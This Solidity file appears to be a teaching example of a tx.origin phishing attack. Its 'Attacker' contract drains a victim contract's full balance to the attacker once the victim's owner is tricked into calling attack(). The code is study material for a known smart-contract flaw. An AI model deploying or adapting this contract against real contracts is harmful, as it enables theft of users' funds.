// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.1;

interface IVictim{
    function transfer(address _to, uint amount) external payable;
    function getBalance() external view returns(uint);
}

contract Attacker {
    address attacker;
    IVictim victimContract;

    constructor(address _victim) {
        attacker = msg.sender;
        victimContract = IVictim(_victim);
    }

    function attack() external payable { // attacker will trick Alice to call this function
        victimContract.transfer(attacker, address(victimContract).balance);
    }
}
